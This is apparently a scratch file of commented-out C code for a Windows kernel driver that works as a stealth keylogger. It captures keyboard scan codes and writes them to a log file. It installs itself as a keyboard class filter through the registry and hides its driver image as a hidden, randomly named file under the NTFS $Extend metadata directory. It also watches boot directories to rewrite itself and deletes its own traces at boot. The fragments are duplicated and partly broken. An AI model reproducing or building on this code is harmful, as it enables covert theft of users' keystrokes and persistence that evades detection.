//	// operations.   
//	//////////////////////////////////////////////////////////////////////   
//	if (pKeyboardDeviceExtension->bThreadTerminate == true)
//	{
//		PsTerminateSystemThread(STATUS_SUCCESS);
//	}
//
//	///////////////////////////////////////////////////////////////////////   
//	// NOTE: the structure contained in the list cannot be accessed directly.    
//	// CONTAINING_RECORD returns a pointer to the beginning of the data structure   
//	// that was inserted into the list.   
//	////////////////////////////////////////////////////////////////////////   
//	kData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
//
//	//Convert the scan code to a key code   
//	char keys[3] = { 0 };
//
//	ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, kData, keys);
//
//	//make sure the key has retuned a valid code before writing it to the file   
//	if (keys != 0)
//	{
//		//write the data out to a file    
//		if (pKeyboardDeviceExtension->hLogFile != NULL) //make sure our file handle is valid   
//		{
//			IO_STATUS_BLOCK io_status;
//			DbgPrint("Writing scan code to file...\n");
//
//
//			NTSTATUS status = ZwWriteFile(pKeyboardDeviceExtension->hLogFile, NULL, NULL, NULL,
//				&io_status, &keys, strlen(keys), NULL, NULL);
//
//			if (status != STATUS_SUCCESS)
//				DbgPrint("Writing scan code to file...\n%x %x", status, io_status);
//			else
//				DbgPrint("Scan code '%s' successfully written to file.\n%x %x", keys, status, io_status);
//			;
//			DbgPrint("byteoffset %i", byteOffset.QuadPart);
//		}//end if
//
//	}//end if      
//}//end while   
//

/////////////////////////////////////////   
//Get and update state of CAPS LOCK key   
/////////////////////////////////////////   
//KEVENT event = { 0 };
//KEYBOARD_INDICATOR_PARAMETERS indParams = { 0 };
//IO_STATUS_BLOCK ioStatus = { 0 };
//NTSTATUS status = { 0 };
//KeInitializeEvent(&event, NotificationEvent, FALSE);

//PIRP irp = IoBuildDeviceIoControlRequest(IOCTL_KEYBOARD_QUERY_INDICATORS, pDevExt->pKeyboardDevice,
//	NULL, 0, &indParams, sizeof(KEYBOARD_ATTRIBUTES), TRUE, &event, &ioStatus);
//status = IoCallDriver(pDevExt->pKeyboardDevice, irp);

//if (status == STATUS_PENDING)
//{
//	(VOID)KeWaitForSingleObject(&event, Suspended, KernelMode,
//		FALSE, NULL);
//}

//status = irp->IoStatus.Status;

//if (status == STATUS_SUCCESS)
//{
//	indParams = *(PKEYBOARD_INDICATOR_PARAMETERS)irp->AssociatedIrp.SystemBuffer;
//	if (irp)
//	{
//		int flag = (indParams.LedFlags & KEYBOARD_CAPS_LOCK_ON);
//		DbgPrint("Caps Lock Indicator Status: %x.\n", flag);
//	}
//	else
//		DbgPrint("Error allocating Irp");
//}//end if   
//DbgPrint("g_DriverSize = 0x%llX, buffer = 0x%llX", g_pDriverImageInfo->DrvImageSize, g_pDriverImageInfo->DrvImageBegin);
//ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//DbgPrint("ZwWriteFile: 0x%lX", ntstatus);
//ZwClose(hDrvFile);
//g_pRunTimeInfo->hLockedDrvFile = hDrvFile;
//DbgPrint("ScanCode: %X", pKeyData[i].MakeCode);
//DbgPrint("irpStack: 0x%llX", irpStack);
//DbgPrint("IRP_MJ_READ!");
//end if 
//DbgPrint("Writing scan code to file...\n");
//{
//IO_STATUS_BLOCK io_status;
//DbgPrint("logging to fil, %lX", ntstatus);
//DbgPrint("Still alive! =%c =%c --- Current local time: %lld", dispVar1, dispVar2, localTime.QuadPart);


//if (!(keyArray[0] == 0) && ((keyArray[1] != 0))) {
//byteOffset.LowPart += blah;
//if (status != STATUS_SUCCESS)
//	DbgPrint("Writing scan code to file...\n%x %x", status, io_status);
//else
//DbgPrint("Scan code '%s' successfully printed to dbgview!", keyArray);

//}//end if
//KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue, Executive, KernelMode, FALSE, NULL);
//pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->QueueListHead,
//	&pKeyboardDeviceExtension->lockQueue);

//KeDelayExecutionThread(KernelMode, FALSE, &interval);
//DbgPrint("pIrp: 0x%llX", pIrp);
//DbgPrint("Completion routine: 0x%llX", irpStack->CompletionRoutine);
//DbgPrint("Hooked completion routine: 0x%llX", irpStack->CompletionRoutine);
//DbgPrint(("%s\n", pKeyData[i].Flags ? "Up" : "Down"));
//	else{
//		ZwFlushBuffersFile(hDrvFile, &ioStatusBlock);
//	}
//	ZwClose(hDrvFile);
//}else{
//	DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//}

//UNREFERENCED_PARAMETER(pContext);
//UNREFERENCED_PARAMETER(pParameter);
//NTSTATUS ntstatus;
//IO_STATUS_BLOCK    ioStatusBlock;
//HANDLE hDrvFile = INVALID_HANDLE_VALUE;

//UNICODE_STRING uDrvFilePath;
//if (0x0 == g_pRunTimeInfo->Flag){
//CreateRandName(g_pRunTimeInfo->DrvRandName, g_pRunTimeInfo->DrvRandNameLength / sizeof(WCHAR));
//CreateRandName(g_pRunTimeInfo->KeyRandName, g_pRunTimeInfo->KeyRandNameLength / sizeof(WCHAR));
//	g_pRunTimeInfo->Flag = 0xFFFFFFFF;
//}

//ZwDeleteKey(hHiderKey);
//
//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//RtlInitUnicodeString(&uDrvFilePath, szDrvFilePath);
//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
//DbgPrint("ZwCreateFile 0x%lX", ntstatus);
//if (NT_SUCCESS(ntstatus)) {
//	ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//	if (!NT_SUCCESS(ntstatus)) {
//		DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//	}
//	else{
//		ZwFlushBuffersFile(hDrvFile, &ioStatusBlock);
//	}
//	ZwClose(hDrvFile);
//}
//else{
//	DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//}
//ZwClose(g_pRunTimeInfo->hServiceKey);
//ZwClose(g_hKey);
//ZwClose(g_hFile);
//ZwClose(g_pRunTimeInfo->hClassKey);
//ZwClose(g_hKey);
//ZwClose(g_hFile);

//	UNREFERENCED_PARAMETER(pIoStatusBlock);
//HANDLE hKey = INVALID_HANDLE_VALUE;
//char pUpperFilters[] = { 0x6B, 0x00, 0x62, 0x00, 0x64, 0x00, 0x63, 0x00, 0x6C, 00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00 };
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e96b-e325-11ce-bfc1-08002be10318}", L"UpperFilters", REG_MULTI_SZ, pUpperFilters, sizeof(pUpperFilters));

//RtlInitUnicodeString(&uKeyToMonitor, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class");
//InitializeObjectAttributes(&objectAttributes2, &uKeyToMonitor, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ntstatus = ZwOpenKey(&hKey, GENERIC_ALL, &objectAttributes2);
//if (NT_SUCCESS(ntstatus)){
//	ZwFlushKey(hKey);
//	ZwClose(hKey);
//}

//ZwClose(g_pRunTimeInfo->hClassKey);
//ZwClose(g_hKey);
//ZwClose(g_hFile);
//	//NTSTATUS ntstatus;
//	//OBJECT_ATTRIBUTES objectAttributes;
//	//IO_STATUS_BLOCK ioStatusBlock;
//	//HANDLE hDrvFile = INVALID_HANDLE_VALUE;
//	//WCHAR szDrvFilePath[MAXCHAR];
//	//UNICODE_STRING uDrvFilePath;
//	////ULONGLONG drvFilePathLength = 0;
//
//	//DbgPrint("Directory contents have changed!, %llX", pContext);
//	//if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hDrvFile){
//	//	ZwClose(g_pRunTimeInfo->hDrvFile);
//	//}
//	////RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//	////RtlStringCbLengthW(szDrvFilePath, sizeof(szDrvFilePath), &drvFilePathLength);
//	////drvFilePathLength += sizeof(WCHAR);
//
//	//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//	//RtlInitUnicodeString(&uDrvFilePath, szDrvFilePath);
//	//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	//ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
//	//DbgPrint("ZwCreateFile 0x%lX", ntstatus);
//	//if (NT_SUCCESS(ntstatus)) {
//	//	ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//	//	if (!NT_SUCCESS(ntstatus)) {
//	//		DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//	//	}
//	//	else{
//	//		ZwFlushBuffersFile(hDrvFile, &ioStatusBlock);
//	//	}
//	//	ZwClose(hDrvFile);
//	//}
//	//else{
//	//	DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//	//}
//
//	//UNICODE_STRING uDirectoryToMonitor;
//	//RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\C:\\$Extend\\$RmMetadata");
//	////RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//	//InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	//ntstatus = ZwOpenFile(&g_pRunTimeInfo->hDrvFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->drvFileIoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
//	//if (!NT_SUCCESS(ntstatus)){
//	//	DbgPrint("Failed to open directory for monitoring! 0x%lX", ntstatus);
//	//	//ZwClose(g_hKey);
//	//	return;
//	//}
//	////PrepOnShutdown(NULL);
//	//ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hDrvFile, NULL, g_pRunTimeInfo->fpDrvFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->drvFileIoStatusBlock, &g_pRunTimeInfo->drvFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_NAME, FALSE);
//	//if (!NT_SUCCESS(ntstatus)){
//	//	DbgPrint("Failed to rearm directory notify routine! 0x%lX", ntstatus);
//	//	ZwClose(g_pRunTimeInfo->hDrvFile);
//	//	//ZwClose(g_hFile);
//	//	return;
//	//}
//	NTSTATUS ntstatus;
//	OBJECT_ATTRIBUTES objectAttributes;
//	//IO_STATUS_BLOCK ioStatusBlock;
//	//HANDLE hDrvFile = INVALID_HANDLE_VALUE;
//	//WCHAR szDrvFilePath[MAXCHAR];
//	//UNICODE_STRING uDrvFilePath;
//	//ULONGLONG drvFilePathLength = 0;
//
//	//DbgPrint("Directory contents have changed!, %llX", pContext);
//	if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hBcdFile){
//		ZwClose(g_pRunTimeInfo->hBcdFile);
//	}
//	//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//	//RtlStringCbLengthW(szDrvFilePath, sizeof(szDrvFilePath), &drvFilePathLength);
//	//drvFilePathLength += sizeof(WCHAR);
//
//	//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\D:\\Boot\\BCD", g_pRunTimeInfo->DrvRandName);
//	//RtlInitUnicodeString(&uDrvFilePath, szDrvFilePath);
//	//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	//ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
//	//DbgPrint("ZwCreateFile 0x%lX", ntstatus);
//	//if (NT_SUCCESS(ntstatus)) {
//	//	ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//	//	if (!NT_SUCCESS(ntstatus)) {
//	//		DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//	//	}
//	//	else{
//	//		ZwFlushBuffersFile(hDrvFile, &ioStatusBlock);
//	//	}
//	//	ZwClose(hDrvFile);
//	//}
//	//else{
//	//	DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//	//}
//
//	UNICODE_STRING uDirectoryToMonitor;
//	RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\C:\\Boot");
//	//RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//	InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	ntstatus = ZwOpenFile(&g_pRunTimeInfo->hBcdFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->bcdFileIoStatusBlock, FILE_SHARE_READ /*| FILE_SHARE_WRITE | FILE_SHARE_DELETE*/, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
//	if (NT_SUCCESS(ntstatus)){
//		goto ende;
//		//ZwClose(g_hKey);
//		//ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hBcdFile, NULL, g_pRunTimeInfo->fpBcdFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->bcdFileIoStatusBlock, &g_pRunTimeInfo->bcdFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_LAST_WRITE, FALSE);
//		//if (!NT_SUCCESS(ntstatus)){
//		//	DbgPrint("Failed to rearm bcd directory notify routine! 0x%lX", ntstatus);
//		//	ZwClose(g_pRunTimeInfo->hBcdFile);
//		//	//ZwClose(g_hFile);
//		//}
//		//return;
//	}
//	DbgPrint("Failed to open c bcd directory for monitoring! 0x%lX", ntstatus);
//	RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\D:\\Boot");
//	//RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//	InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	ntstatus = ZwOpenFile(&g_pRunTimeInfo->hBcdFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->bcdFileIoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
//	if (NT_SUCCESS(ntstatus)){
//		goto ende;
//		//ZwClose(g_hKey);
//		//ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hBcdFile, NULL, g_pRunTimeInfo->fpBcdFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->bcdFileIoStatusBlock, &g_pRunTimeInfo->bcdFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_LAST_WRITE, FALSE);
//		//if (!NT_SUCCESS(ntstatus)){
//		//	DbgPrint("Failed to rearm bcd directory notify routine! 0x%lX", ntstatus);
//		//	ZwClose(g_pRunTimeInfo->hBcdFile);
//		//	//ZwClose(g_hFile);
//		//}
//		//return;
//	}
//	DbgPrint("Failed to open d bcd directory for monitoring! 0x%lX", ntstatus);
//	RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\E:\\Boot");
//	//RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//	InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	ntstatus = ZwOpenFile(&g_pRunTimeInfo->hBcdFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->bcdFileIoStatusBlock, FILE_SHARE_READ /*| FILE_SHARE_WRITE | FILE_SHARE_DELETE*/, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
//	if (NT_SUCCESS(ntstatus)){
//		goto ende;
//		//ZwClose(g_hKey);
//		//ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hBcdFile, NULL, g_pRunTimeInfo->fpBcdFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->bcdFileIoStatusBlock, &g_pRunTimeInfo->bcdFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_LAST_WRITE, FALSE);
//		//if (!NT_SUCCESS(ntstatus)){
//		//	DbgPrint("Failed to rearm bcd directory notify routine! 0x%lX", ntstatus);
//		//	ZwClose(g_pRunTimeInfo->hBcdFile);
//		//	//ZwClose(g_hFile);
//		//}
//		//return;
//	}
//	DbgPrint("Failed to open e bcd directory for monitoring! 0x%lX", ntstatus);
//	//RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\D:\\Boot");
//	////RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//	//InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	//ntstatus = ZwOpenFile(&g_pRunTimeInfo->hBcdFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->bcdFileIoStatusBlock, FILE_SHARE_READ /*| FILE_SHARE_WRITE | FILE_SHARE_DELETE*/, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
//	//if (NT_SUCCESS(ntstatus)){
//
//	//	//ZwClose(g_hKey);
//	//	ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hBcdFile, NULL, g_pRunTimeInfo->fpBcdFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->bcdFileIoStatusBlock, &g_pRunTimeInfo->bcdFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_LAST_WRITE, FALSE);
//	//	if (!NT_SUCCESS(ntstatus)){
//	//		DbgPrint("Failed to rearm bcd directory notify routine! 0x%lX", ntstatus);
//	//		ZwClose(g_pRunTimeInfo->hBcdFile);
//	//		//ZwClose(g_hFile);
//	//	}
//	//	goto ende;
//	//}
//	//DbgPrint("Failed to open d bcd directory for monitoring! 0x%lX", ntstatus);
//
//	//RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\D:\\Boot");
//	////RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//	//InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	//ntstatus = ZwOpenFile(&g_pRunTimeInfo->hBcdFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->bcdFileIoStatusBlock, FILE_SHARE_READ /*| FILE_SHARE_WRITE | FILE_SHARE_DELETE*/, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
//	//if (!NT_SUCCESS(ntstatus)){
//
//	//	//ZwClose(g_hKey);
//
//	//	return;
//	//}
//	//DbgPrint("Failed to open e bcd directory for monitoring! 0x%lX", ntstatus);
//ende:
//	ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hBcdFile, NULL, g_pRunTimeInfo->fpBcdFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->bcdFileIoStatusBlock, &g_pRunTimeInfo->bcdFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_LAST_WRITE, FALSE);
//	if (!NT_SUCCESS(ntstatus)){
//		DbgPrint("Failed to rearm bcd directory notify routine! 0x%lX", ntstatus);
//		ZwClose(g_pRunTimeInfo->hBcdFile);
//		//ZwClose(g_hFile);
//	}
//PrepOnShutdown(NULL);
//RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//UNREFERENCED_PARAMETER(pContext);
//ULONGLONG drvFilePathLength = 0;

//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//RtlStringCbLengthW(szDrvFilePath, sizeof(szDrvFilePath), &drvFilePathLength);
//drvFilePathLength += sizeof(WCHAR);

//RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//ZwClose(g_hKey);
//ZwClose(g_pRunTimeInfo->hDrvFile);
//PrepOnShutdown(NULL);
//ZwClose(g_hFile);
//ZwClose(g_hKey);
//ZwClose(g_pRunTimeInfo->hDrvFile);
//PrepOnShutdown(NULL);
//ZwClose(g_hFile);


//void WorkerThread(PVOID pStartContext);
//g_pRunTimeInfo->initFlag = 0x0;
//PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, fpNewmemInitThread, g_pRunTimeInfo->fpSvcKeyWorkItem);
//if (NULL != hThread){
//	ZwClose(hThread);		///The thread handle is useless to us
//}

//PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, fpNewmemInitThread, g_pRunTimeInfo->fpClsKeyWorkItem);
//if (NULL != hThread){
//	ZwClose(hThread);		///The thread handle is useless to us
//}
//g_pRunTimeInfo->initFlag = 0xFFFFFFFFFFFFFFFF;

//Value type = ?????
//RewriteBogusFile(NULL, NULL);
//g_pKbdHookInfo->pKbdDrvObj = NULL;


//ULONG infoSize = 0;
//void BogusThread(PVOID pStartContext){
//	UNREFERENCED_PARAMETER(pStartContext);
//	DbgPrint("BogusThread: Hello from BogusThread");
//	g_pRunTimeInfo->hBogusFile = INVALID_HANDLE_VALUE;
//	for (;;){
//		ZwWaitForSingleObject(g_pRunTimeInfo->hEvent, FALSE, NULL);
//		DbgPrint("BogusThread: \"Rewritten\" bogus dir.");
//	}
//}
//Value type = ?????
//RewriteBogusFile(NULL, NULL);
//g_pKbdHookInfo->pKbdDrvObj = NULL;
//KeInitializeEvent(&g_pRunTimeInfo->kevent, SynchronizationEvent, FALSE);
//g_pRunTimeInfo->hEvent = INVALID_HANDLE_VALUE;
//ZwCreateEvent(&g_pRunTimeInfo->hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);

//g_pRunTimeInfo->hOldDrvFile = INVALID_HANDLE_VALUE;
//UNICODE_STRING uDrvRegPath;
//UNICODE_STRING uDrvFilePath;
//WCHAR szDrvFilePath[MAXCHAR];
//WCHAR szDrvRegPath[MAXCHAR];
//WCHAR szOldRegName[9];

//RtlStringCbPrintfW(szDrvRegPath, sizeof(szDrvRegPath), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Zz%ws", g_pRunTimeInfo->KeyRandName);
//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);

//RtlCopyMemory(szOldRegName, (1 + g_pRunTimeInfo->OldRegPath->Buffer + (g_pRunTimeInfo->OldRegPath->Length - sizeof(szOldRegName)) / sizeof(WCHAR)), sizeof(szOldRegName));

//RtlInitUnicodeString(&uDrvRegPath, szDrvRegPath);
//RtlInitUnicodeString(&uDrvFilePath, szDrvFilePath);
//InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ntstatus = ZwOpenKey(&hKey, DELETE, &objectAttributes);
//if (NT_SUCCESS(ntstatus)){
//	ntstatus = ZwDeleteKey(hKey);
//	DbgPrint("PrepOnBoot: ZwDeleteKey(drv reg path) (0x%lX)", ntstatus);
//	ZwClose(hKey);
//}

//ZwOpenKey(&hKey, DELETE, &objectAttributes);
//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ntstatus = ZwDeleteFile(&objectAttributes);
//DbgPrint("PrepOnBoot: ZwDeleteFile(drv path) (0x%lX)", ntstatus);

//PKEY_BASIC_INFORMATION pBootEntry = NULL;
/*
Cm

infoSize = resultLength;
pBootEntry = (PKEY_BASIC_INFORMATION)ExAllocatePool(NonPagedPool, infoSize);
if (NULL == pBootEntry){
DbgPrint("Memory allocation failed!");
}
else{
ntstatus = ZwEnumerateKey(g_pRunTimeInfo->hBcdKey, 0, KeyBasicInformation, pBootEntry, infoSize, &resultLength);
if (STATUS_BUFFER_TOO_SMALL != ntstatus){
DbgPrint("Unexpected behavior of ZwEnumerateKey (0x%llX)");
}
for (size_t i = 0; i < length; i++){

}
}*/
// = ZwEnumerateKey(g_pRunTimeInfo->hBcdKey, 0, KeyBasicInformation, NULL, 0, &resultLength);

// DbgPrint("ZwCreateFile 0x%lX", ntstatus);
//if (INVALID_HANDLE_VALUE == g_pRunTimeInfo->hDrvFile){
//if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hOldDrvFile){
//	ZwClose(g_pRunTimeInfo->hOldDrvFile);
//}
//DbgPrint("RewriteDrvFile: Closed handle 0x%llX", g_pRunTimeInfo->hOldDrvFile);
//g_pRunTimeInfo->hOldDrvFile = g_pRunTimeInfo->hDrvFile;

//}
//else{
//	DbgPrint("RewriteDrvFile: Handle was already valid");
//}

//ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hDrvFile, NULL, g_pRunTimeInfo->fpDrvFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->drvFileIoStatusBlock, &g_pRunTimeInfo->drvFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_NAME, FALSE);
//
//void RewriteBogusFile(PVOID pContext, PIO_STATUS_BLOCK pIoStatusBlock){
//	UNREFERENCED_PARAMETER(pContext);
//	UNREFERENCED_PARAMETER(pIoStatusBlock);
//	NTSTATUS ntstatus;
//	OBJECT_ATTRIBUTES objectAttributes;
//	//IO_STATUS_BLOCK ioStatusBlock;
//	//HANDLE hDrvFile = INVALID_HANDLE_VALUE;
//	//WCHAR szDrvFilePath[MAXCHAR];
//	//UNICODE_STRING uDrvFilePath;
//	//ULONGLONG drvFilePathLength = 0;
//
//	DbgPrint("RewriteBogusFile: Locking directory...", pContext);
//	if (INVALID_HANDLE_VALUE != g_pRunTimeInfo->hBogusFile){
//		ZwClose(g_pRunTimeInfo->hBogusFile);
//	}
//	//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//	//RtlStringCbLengthW(szDrvFilePath, sizeof(szDrvFilePath), &drvFilePathLength);
//	//drvFilePathLength += sizeof(WCHAR);
//
//	//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//	//RtlInitUnicodeString(&uDrvFilePath, szDrvFilePath);
//	//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	////ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
//	////DbgPrint("ZwCreateFile 0x%lX", ntstatus);
//	//if (NT_SUCCESS(ntstatus)) {
